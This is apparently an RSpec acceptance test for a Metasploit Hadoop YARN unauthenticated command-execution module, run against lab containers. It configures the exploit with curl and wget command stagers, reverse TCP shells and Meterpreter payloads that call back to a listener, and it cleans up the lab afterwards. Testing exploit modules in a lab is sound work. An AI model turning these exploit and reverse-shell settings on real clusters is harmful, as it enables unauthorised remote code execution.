require 'acceptance_spec_helper'
require 'net/http'
require 'timeout'

profile = ENV.fetch('HADOOP_YARN_PROFILE', 'commands')
raise ArgumentError, "Unknown YARN profile: #{profile}" unless %w[commands sessions].include?(profile)

RSpec.describe 'Native Hadoop YARN targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    stdout, stderr, status = Open3.capture3('python3', 'test/module_targets/hadoop_yarn/native_probe.py')
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-hadoop-preflight.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-hadoop-preflight-status.json'), JSON.pretty_generate(stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
    @native = JSON.parse(stdout)
  end

  if profile == 'commands'
    [
      ['resourcemanager', '/', {}, true],
      ['gateway', '/yarn/', {}, true],
      ['gateway', '/secured/', { 'HttpUsername' => 'module-test-user', 'HttpPassword' => 'module-test-password' }, true],
      ['gateway', '/secured/', {}, false],
      ['gateway', '/secured/', { 'HttpUsername' => 'module-test-user', 'HttpPassword' => 'wrong-password' }, false],
      ['gateway', '/denied/', {}, false],
      ['gateway', '/missing/', {}, false],
      ['unrelated', '/', {}, false]
    ].each do |service, path, options, appears|
      it "checks #{service} #{path} with #{options.fetch('HttpPassword', 'no credentials')}" do
        before = applications.keys
        output = invoke(service, options.merge('TARGETURI' => path), action: 'check')
        expect(output).to include(appears ? 'The target appears to be vulnerable.' : 'The target is not exploitable.')
        expect(applications.keys).to eq(before)
        expect_idle
      end
    end

    [
      ['gateway', '/secured/', { 'HttpUsername' => 'module-test-user', 'HttpPassword' => 'wrong-password' }],
      ['gateway', '/denied/', {}],
      ['gateway', '/missing/', {}],
      ['unrelated', '/', {}]
    ].each do |service, prefix, credentials|
      it "refuses execution on #{service} #{prefix} without creating state" do
        with_run_state do
          output = invoke(service, command_options.merge(credentials).merge('TARGETURI' => prefix))
          expect(output).to include('Could not retrieve application-id')
          expect(applications.keys).to eq(@run_before.fetch(:applications).keys)
          expect(file_state).to eq(@run_before.fetch(:files))
        end
      end
    end

    [
      ['x86 default', 'resourcemanager', '/', 'linux/x86/exec', 'auto', {}],
      ['x64 printf prefix', 'gateway', '/yarn/', 'linux/x64/exec', 'printf', {}],
      ['x64 curl Basic', 'gateway', '/secured/', 'linux/x64/exec', 'curl', { 'HttpUsername' => 'module-test-user', 'HttpPassword' => 'module-test-password' }],
      ['x64 wget prefix', 'gateway', '/yarn/', 'linux/x64/exec', 'wget', {}]
    ].each do |description, service, prefix, payload, flavor, credentials|
      it "executes #{description} twice with exact bytes and restores owned state" do
        2.times do
          with_run_state do
            output = invoke(service, command_options.merge(credentials).merge('TARGETURI' => prefix, 'PAYLOAD' => payload, 'CMDSTAGER::FLAVOR' => flavor))
            expect(output).not_to match(/Exploit failed|Exploit aborted/)
            Timeout.timeout(30) do
              wait_for_expect(100, 0.1) do
                expect(target_exec('nodemanager', 'sh', '-c', 'if test -f "$1"; then cat "$1"; fi', 'sh', proof_path)).to eq('Hadoop command: exact proof')
              end
            end
            expect(target_exec('nodemanager', 'stat', '-c', '%u:%g', proof_path).strip).to eq('1000:100')
          end
        end
      end
    end
  else
    [
      ['x86 shell', 'resourcemanager', '/', 'linux/x86/shell_reverse_tcp', 'printf', {}],
      ['x64 staged Meterpreter', 'gateway', '/secured/', 'linux/x64/meterpreter/reverse_tcp', 'printf', { 'HttpUsername' => 'module-test-user', 'HttpPassword' => 'module-test-password' }],
      ['x64 wget shell', 'gateway', '/yarn/', 'linux/x64/shell_reverse_tcp', 'wget', {}]
    ].each do |description, service, prefix, payload, flavor, credentials|
      it "opens and uses #{description} twice, then stops owned applications and sessions" do
        2.times do
          with_run_state do
            expect(console_command('sessions -l')).to include('No active sessions')
            options = command_options.except('CMD').merge(credentials).merge('TARGETURI' => prefix, 'PAYLOAD' => payload, 'CMDSTAGER::FLAVOR' => flavor,
                                                                             'LHOST' => listener_host, 'LPORT' => 4445, 'WfsDelay' => 15, 'DisablePayloadHandler' => false)
            options['CMD'] = '/bin/sh' if payload == 'linux/x86/shell_reverse_tcp'
            output = invoke(service, options, action: 'run -z', command_timeout: 70)
            session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
            expect(session_id).not_to be_nil, output
            meterpreter = payload.include?('meterpreter')
            command = meterpreter ? "execute -f /usr/bin/touch -a #{proof_path}" : "id; /usr/bin/touch #{proof_path}; echo YARN_REMOTE_PID:$$"
            proof = console_command("sessions -i #{session_id} #{meterpreter ? '-C' : '-c'} #{command.inspect}")
            expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
            expect(proof).to include('uid=1000(hadoop)') unless meterpreter
            identity = meterpreter ? console_command("sessions -i #{session_id} -C getpid") : proof
            @remote_pid = identity[meterpreter ? /Current pid:\s*(\d+)/i : /YARN_REMOTE_PID:(\d+)/, 1]
            expect(@remote_pid).not_to be_nil, identity
            target_exec('nodemanager', 'kill', '-0', @remote_pid)
            target_exec('nodemanager', 'ps', '-p', @remote_pid, '-o', 'pid=,ppid=,args=')
            Timeout.timeout(15) do
              wait_for_expect(60, 0.1) do
                expect(target_exec('nodemanager', 'sh', '-c', 'if test -f "$1"; then stat -c %u:%g "$1"; fi', 'sh', proof_path).strip).to eq('1000:100')
              end
            end
          end
        end
      end
    end
  end

  def invoke(service, options = {}, action: 'run', command_timeout: 70)
    defaults = { 'SSL' => false, 'HttpClientTimeout' => 5, 'HttpUsername' => '', 'HttpPassword' => '' }
    configured = defaults.merge(options)
    configured.delete('TARGETURI') if configured['TARGETURI'] == '/'
    output = run_target_module('exploit/linux/http/hadoop_unauth_exec', service, configured, action: action, allow_errors: true, command_timeout: command_timeout)
    warnings = output.scan(/Unknown datastore option: ([A-Za-z0-9_:]+)/).flatten.uniq
    # The owner reads this undeclared option; retain that warning as a scope limit.
    expect(warnings).to match_array(configured['TARGETURI'] ? ['TARGETURI'] : [])
    File.open(File.join(target_runtime.fetch('artifacts'), 'option-warnings.jsonl'), 'a') do |log|
      log.puts(JSON.generate(service: service, action: action, target_uri: configured['TARGETURI'], warnings: warnings))
    end
    @stager_urls = output.scan(%r{http://[^/\s]+:8081/[A-Za-z0-9._/-]+}).uniq
    expect(@stager_urls).not_to be_empty if action != 'check' && %w[curl wget].include?(options['CMDSTAGER::FLAVOR'])
    output
  end

  def proof_path
    '/tmp/module-target-hadoop-framework-proof'
  end

  def command_options
    {
      'PAYLOAD' => 'linux/x64/exec', 'CMD' => "printf '%s' 'Hadoop command: exact proof' > #{proof_path}",
      'CMDSTAGER::FLAVOR' => 'printf', 'CMDSTAGER::TEMP' => '/tmp/', 'SRVHOST' => listener_host, 'SRVPORT' => 8081
    }
  end

  def request(path, method: :get, data: nil)
    endpoint = target_endpoint('resourcemanager')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 3
    http.read_timeout = 5
    klass = { get: Net::HTTP::Get, put: Net::HTTP::Put }.fetch(method)
    req = klass.new(path)
    req['Accept'] = 'application/json'
    req['Content-Type'] = 'application/json'
    req.body = JSON.generate(data) if data
    response = http.request(req)
    File.open(File.join(target_runtime.fetch('artifacts'), 'native-hadoop-state.jsonl'), 'a') do |log|
      log.puts(JSON.generate(path: path, method: method, request: data, code: response.code.to_i, headers: response.to_hash, body: response.body))
    end
    expect(%w[200 202]).to include(response.code), response.body
    response.body.to_s.empty? ? {} : JSON.parse(response.body)
  end

  def applications
    rows = request('/ws/v1/cluster/apps').fetch('apps', {}).fetch('app', [])
    rows.to_h { |row| [row.fetch('id'), row] }
  end

  def file_state
    target_exec('nodemanager', 'find', '/tmp', '-maxdepth', '1', '-type', 'f', '-printf', '%p\n').lines.map(&:strip).sort
  end

  def expect_idle
    Timeout.timeout(20) do
      wait_for_expect(100, 0.1) do
        metrics = request('/ws/v1/cluster/metrics').fetch('clusterMetrics')
        expect(metrics.values_at('activeNodes', 'appsPending', 'appsRunning', 'containersAllocated')).to eq([1, 0, 0, 0])
        running = JSON.parse(target_exec('nodemanager', 'curl', '-fsS', 'http://nodemanager:8042/ws/v1/node/containers'))
        expect(running.fetch('containers', nil)).to be_nil.or eq({})
      end
    end
  end

  def with_run_state
    @remote_pid = nil
    @run_before = { applications: applications, files: file_state }
    target_exec('nodemanager', 'test', '!', '-e', proof_path)
    expect_idle
    yield
  ensure
    restore_run_state if @run_before
  end

  def restore_run_state
    original_error = $ERROR_INFO
    after = applications
    added = after.keys - @run_before.fetch(:applications).keys
    added.each do |app|
      expect(app).to match(/\Aapplication_\d+_\d+\z/)
      request("/ws/v1/cluster/apps/#{app}/appattempts")
      capture_application_logs(app)
      request("/ws/v1/cluster/apps/#{app}/state", method: :put, data: { state: 'KILLED' })
    end
    expect_idle
    unless @console_broken
      console_command('sessions -K')
      console_command('jobs -K')
      expect(console_command('sessions -l')).to include('No active sessions')
      expect(console_command('jobs -l')).to include('No active jobs')
      prove_framework_cleanup
    end
    if @remote_pid
      Timeout.timeout(10) do
        wait_for_expect(50, 0.1) do
          expect(target_exec('nodemanager', 'sh', '-c', 'if kill -0 "$1" 2>/dev/null; then printf present; else printf absent; fi', 'sh', @remote_pid)).to eq('absent')
        end
      end
    end
    files = file_state - @run_before.fetch(:files)
    @restoration_index = (@restoration_index || 0) + 1
    files.each_with_index do |path, index|
      destination = File.join(target_runtime.fetch('artifacts'), "target-run-#{@restoration_index}-#{index}")
      output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'cp', "nodemanager:#{path}", destination)
      File.open(File.join(target_runtime.fetch('artifacts'), 'target-captures.jsonl'), 'a') { |log| log.puts(JSON.generate(path: path, destination: destination, stdout: output, stderr: error, exitstatus: status.exitstatus)) }
      expect(status.success?).to be(true), error
    end
    File.open(File.join(target_runtime.fetch('artifacts'), 'operator-restoration.jsonl'), 'a') do |log|
      log.puts(JSON.generate(before: @run_before, after_module: after, owned_applications: added, remote_pid: @remote_pid, removed_files: files))
    end
    target_exec('nodemanager', 'rm', '-f', '--', *files) unless files.empty?
    expect(file_state).to eq(@run_before.fetch(:files))
    expect(applications.keys - @run_before.fetch(:applications).keys).to match_array(added)
    states = applications.values.select { |app| added.include?(app.fetch('id')) }.map { |app| app.fetch('state') }
    expect(states - %w[KILLED FAILED FINISHED]).to eq([])
    @run_before = nil
  rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
    RSpec.world.wants_to_quit = true
    File.open(File.join(target_runtime.fetch('artifacts'), 'restoration-errors.jsonl'), 'a') { |log| log.puts(JSON.generate(error: e.class.name, message: e.message)) }
    raise unless original_error
  end

  def capture_application_logs(app)
    path = "/data/yarn/logs/#{app}"
    state = target_exec('nodemanager', 'sh', '-c', 'if test -d "$1"; then printf present; else printf absent; fi', 'sh', path)
    return unless state == 'present'

    destination = File.join(target_runtime.fetch('artifacts'), "application-logs-#{app}")
    output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'cp', "nodemanager:#{path}", destination)
    File.open(File.join(target_runtime.fetch('artifacts'), 'application-log-captures.jsonl'), 'a') do |log|
      log.puts(JSON.generate(application: app, path: path, destination: destination, stdout: output, stderr: error, exitstatus: status.exitstatus))
    end
    expect(status.success?).to be(true), error
  end

  def prove_framework_cleanup
    code = 'puts "YARN_HTTP_OWNERS:" + JSON.generate(Rex::ServiceManager.instance.values.uniq.grep(Rex::Proto::Http::Server).select { |server| server.listen_port == 8081 }.map { |server| { resources: server.resources.keys, references: server.instance_variable_get(:@_references) } })'
    output = console_command("irb -e #{code.inspect}")
    raw = output[/^YARN_HTTP_OWNERS:(\[.*\])\r?$/, 1]
    expect(raw).not_to be_nil, output
    owners = JSON.parse(raw)
    expect(owners.flat_map { |owner| owner.fetch('resources') }).to eq([])
    File.open(File.join(target_runtime.fetch('artifacts'), 'framework-http-owners.jsonl'), 'a') { |log| log.puts(JSON.generate(owners: owners)) }
    # HTTP servers may be pooled; prove removal of each actual generated URL.
    Array(@stager_urls).each do |url|
      uri = URI(url)
      expect([uri.host, uri.port]).to eq([listener_host, 8081])
      probe = 'require "json"; require "net/http"; uri=URI(ARGV.fetch(0)); begin; http=Net::HTTP.new(uri.host,uri.port,nil); http.open_timeout=2; http.read_timeout=2; puts JSON.generate(code:http.get(uri.request_uri).code.to_i); rescue Errno::ECONNREFUSED; puts JSON.generate(state:"refused"); end'
      result = JSON.parse(target_exec('framework', 'ruby', '-e', probe, url))
      expect([{ 'code' => 404 }, { 'state' => 'refused' }]).to include(result)
      File.open(File.join(target_runtime.fetch('artifacts'), 'framework-resource-removal.jsonl'), 'a') { |log| log.puts(JSON.generate(url: url, result: result)) }
    end
    script = 'require "json"; puts JSON.generate(%w[/proc/net/tcp /proc/net/tcp6].flat_map { |file| File.readlines(file).drop(1).map(&:split) }.select { |row| row[3] == "0A" && row[1].split(":").last.to_i(16) == 4445 })'
    Timeout.timeout(10) { wait_for_expect(50, 0.1) { expect(JSON.parse(target_exec('framework', 'ruby', '-e', script))).to eq([]) } }
  end
end

# Prepend preserves the shared-context method on the example group itself.
module HadoopTargetConsoleGuard
  def console_command(command, timeout: 40)
    raise Acceptance::ChildProcessTimeoutError, 'Console transport failed; diagnostic stopped' if @console_broken

    super
  rescue Acceptance::ChildProcessTimeoutError, Acceptance::ChildProcessRecvError, EOFError, Errno::EPIPE
    @console_broken = true
    RSpec.world.wants_to_quit = true
    raise
  end
end

group = RSpec.world.example_groups.find { |item| item.description == 'Native Hadoop YARN targets' }
raise 'Hadoop target group is missing' unless group

group.prepend(HadoopTargetConsoleGuard)
